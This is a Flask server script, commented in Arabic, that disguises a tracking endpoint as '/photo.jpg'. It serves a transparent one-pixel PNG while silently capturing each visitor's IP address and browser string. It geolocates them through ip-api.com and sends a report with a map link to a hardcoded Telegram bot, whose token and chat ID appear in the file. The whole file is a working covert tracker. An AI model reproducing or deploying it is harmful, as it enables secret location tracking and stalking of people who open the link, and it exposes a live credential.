from flask import Flask, request, send_file
import requests
import io
import os # ضروري جداً

app = Flask(__name__)

# بياناتك الصحيحة من الصور
TELEGRAM_TOKEN = "8459471902:AAHLHHniOWAQSDznm5TFWWmUzROr9cf_CUo"
CHAT_ID = "8524242091"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, json=payload, timeout=5)

@app.route('/')
@app.route('/photo.jpg')
def advanced_trap():
    # جلب الـ IP الحقيقي
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', '')

    try:
        # جلب البيانات من API الموقع
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        
        # تنسيق الرسالة
        report = (
            f"🚀 <b>تم رصد جهاز جديد!</b>\n\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"📍 <b>الموقع:</b> {r.get('city')}, {r.get('country')}\n"
            f"📱 <b>المتصفح:</b> <code>{ua[:50]}...</code>\n"
            f"🔗 <a href='https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}'>موقع الجهاز على الخريطة</a>"
        )
        
        # إرسال الرسالة فوراً
        send_to_telegram(report)
    except Exception as e:
        print(f"Error: {e}")

    # إرجاع بكسل شفاف (عملية صامتة)
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')
